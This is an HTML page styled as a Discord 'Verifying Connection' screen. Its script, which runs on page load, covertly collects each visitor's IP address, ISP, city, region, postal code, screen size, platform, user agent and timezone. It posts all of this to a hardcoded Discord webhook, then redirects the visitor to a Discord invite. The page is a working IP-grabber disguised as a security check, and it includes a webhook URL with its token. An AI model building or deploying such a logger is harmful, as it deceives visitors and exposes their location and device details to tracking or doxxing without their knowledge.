<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <style>
        body {
            background-color: #313338;
            color: #dbdee1;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2b2d31;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #5865F2;
            animation: spin 1s ease infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #949ba4;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="spinner"></div>
        <h1>Verifying Connection...</h1>
        <p>Please wait while we secure your session.</p>
    </div>

    <script>
        // CONFIGURATION
        const webhookUrl = "https://discord.com/api/webhooks/1567775494743658529/Qi7itPaeJWmBvMyg42-eur4Q_Xd60iGgMMd8X2q5Cf4xABPH4Mh_NH0uo4FPls2WpF1W";
        const redirectUrl = "https://discord.gg/7T72xgbV4c"; // e.g., "https://discord.gg/yourserver"

        async function logAndRedirect() {
            try {
                // 1. Fetch IP and Location data
                const ipRes = await fetch("https://ipapi.co/json/");
                const ipData = await ipRes.json();

                // 2. Fetch Device Info
                const deviceInfo = {
                    screen: `${window.screen.width}x${window.screen.height}`,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                // 3. Build the Webhook Payload
                const payload = {
                    username: "Security Gateway",
                    content: "⚠️ **New User Verified**",
                    embeds: [{
                        title: "Connection Logged",
                        color: 3447003, // Discord Blue
                        fields: [
                            { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
                            { name: "ISP", value: `\`${ipData.org}\``, inline: true },
                            { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name} (${ipData.postal})`, inline: false },
                            { name: "Device", value: `\`${deviceInfo.platform}\``, inline: true },
                            { name: "Screen", value: `\`${deviceInfo.screen}\``, inline: true },
                            { name: "Timezone", value: `\`${deviceInfo.timezone}\``, inline: false },
                            { name: "User Agent", value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
                        ],
                        footer: { text: "Discord Security | " + new Date().toUTCString() }
                    }]
                };

                // 4. Send to Webhook
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.error("Logger failed", err);
            } finally {
                // 5. Redirect them to Discord immediately (whether it logged or not)
                window.location.href = redirectUrl;
            }
        }

        // Run the function when the page loads
        window.onload = () => {
            // Small delay so the animation is visible and the browser renders
            setTimeout(logAndRedirect, 1500);
        };
    </script>
</body>
</html>
